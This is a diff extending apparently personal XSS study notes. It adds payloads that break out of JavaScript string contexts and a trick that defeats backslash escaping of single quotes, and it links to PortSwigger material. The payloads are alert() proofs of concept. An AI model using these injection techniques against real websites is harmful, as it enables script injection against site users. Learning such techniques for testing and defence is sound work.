@@ -41,4 +41,25 @@ Payload:
 </script><img src=1 onerror=alert(document.domain)>
 ```
 
-#to-be-continued 
+##### Breaking out of a JavaScript string
+```javascript
+'-alert(document.domain)-'
+';alert(document.domain)//
+```
+
+##### Bypass escaping single quotes with a backslash
+For example, suppose that the input:
+`';alert(document.domain)//`
+
+gets converted to:
+`\';alert(document.domain)//`
+
+You can now use the alternative payload:
+`\';alert(document.domain)//`
+
+which gets converted to:
+`\\';alert(document.domain)//`
+
+##### WAF blocks some characters
+https://portswigger.net/web-security/cross-site-scripting/contexts - #to-be-continued 
+https://portswigger.net/research/xss-without-parentheses-and-semi-colons
